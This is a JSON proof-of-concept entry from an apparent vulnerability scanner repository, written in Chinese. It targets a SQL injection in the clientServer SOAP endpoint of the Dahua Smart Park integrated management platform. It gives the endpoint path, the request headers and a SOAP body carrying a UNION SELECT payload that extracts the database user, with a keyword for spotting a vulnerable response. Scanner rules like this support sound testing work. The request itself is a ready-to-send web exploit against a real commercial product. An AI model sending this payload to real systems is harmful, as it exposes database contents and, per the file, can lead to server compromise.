Hunting-Rabbit-VulScanner/poc/大华/大华智慧园区综合管理平台clientServer存在SQL注入漏洞.json

{
    "vul_name": "大华智慧园区综合管理平台clientServer存在SQL注入漏洞",
    "level": "高危",
    "description": "大华智慧园区综合管理平台是一款综合管理平台，具备园区运营、资源调配和智能服务等功能。平台意在协助优化园区资源分配，满足多元化的管理需求，同时通过提供智能服务，增强使用体验。可通过该漏洞拿到数据库数据，甚至服务器权限",
    "product": "大华 智慧园区综合管理平台",
    "version": "大华智慧园区综合管理平台",
    "cve": "无",
    "reference": "https://mp.weixin.qq.com/s/kOQbig-SuBHLuWIl4Be-Ow",
    "fixing": "联系厂商升级修复",
    "rule": {
        "path": "/portal/services/clientServer",
        "method": "POST",
        "headers": "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: close\r\nHost: 127.0.0.1\r\nContent-Type: text/xml;charset=UTF-8\r\nContent-Length: 421",
        "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:cli=\"http://clientServer.webservice.dssc.dahua.com\">\r\n  <soapenv:Header/>\r\n  <soapenv:Body>\r\n  <cli:getGroupInfoListByGroupId>\r\n    <!--type: string-->\r\n      <arg0>-5398) UNION ALL SELECT 5336,5336,5336,5336,user()-- -</arg0>\r\n    <!--type: long-->\r\n    <arg1>10</arg1>\r\n    </cli:getGroupInfoListByGroupId>\r\n    </soapenv:Body>\r\n  </soap:Envelope>",
        "status_code": "200",
        "keywords": "5336",
        "res_time": ""
    },
    "operator": {
        "author": "浪飒",
        "email": "langsa-hy@qq.com",
        "github": "https://github.com/langsasec"
    }
}